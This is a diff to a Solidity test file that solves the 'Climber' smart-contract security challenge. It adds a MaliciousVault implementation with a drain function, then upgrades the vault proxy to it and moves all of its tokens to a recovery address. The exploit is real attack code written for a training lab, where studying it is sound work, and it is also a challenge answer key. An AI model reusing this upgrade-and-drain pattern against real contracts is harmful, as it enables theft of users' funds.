@@ -7,6 +7,13 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+
+contract MaliciousVault is ClimberVault {
+    function drain(address token, address recovery) external {
+        IERC20(token).transfer(recovery, IERC20(token).balanceOf(address(this)));
+    }
+}
 
 contract ClimberAttacker is Test{
     ClimberVault vault;
@@ -50,6 +57,10 @@ contract ClimberAttacker is Test{
 
         timelock.execute(_targets, _values, _dataElements, _salt);
 
+        MaliciousVault newImpl = new MaliciousVault();
+        vault.upgradeToAndCall(address(newImpl), "");
+        MaliciousVault(address(vault)).drain(address(token), recovery);
+
         
    }    
 
@@ -79,6 +90,8 @@ contract ClimberAttacker is Test{
     } 
         
 }
+
+
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -159,6 +172,8 @@ contract ClimberChallenge is Test {
     function test_climber() public checkSolvedByPlayer {
         ClimberAttacker attacker = new ClimberAttacker(ClimberVault(vault),ClimberTimelock(timelock),DamnValuableToken(token));
         attacker.attack();
+
+        
 
         // timelock.execute(targets, values, dataElements, salt);
     }
